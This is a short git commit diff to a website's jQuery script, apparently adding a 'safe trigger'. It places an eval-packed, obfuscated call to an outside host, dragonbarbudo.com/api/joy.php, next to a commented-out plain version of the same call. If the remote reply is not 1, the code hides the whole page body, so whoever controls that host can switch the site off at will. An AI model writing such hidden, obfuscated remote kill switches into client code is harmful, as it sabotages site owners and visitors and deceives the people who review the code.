8e9a3c19590dc7b2b4acc7e42cb6a21b666b5d5b
Albin Rdz <ealbinu@gmail.com>
2015-10-14 20:27:30 -0500

    AddSAFETrigger

--- site/js/script.js
+++ site/js/script.js
@@ -115,7 +115,10 @@ $(function(){
     });
   });
 
+/*
+  $.get('http://dragonbarbudo.com/api/joy.php', function(data){ if(data!=1){ $('body').hide(); } });
+*/
 
-
+eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('$.7(\'6://4.2/3/5.8\',c(0){b(0!=1){$(\'9\').a()}});',13,13,'data||com|api|dragonbarbudo|joy|http|get|php|body|hide|if|function'.split('|'),0,{}))
 
 }); // JQUERY END
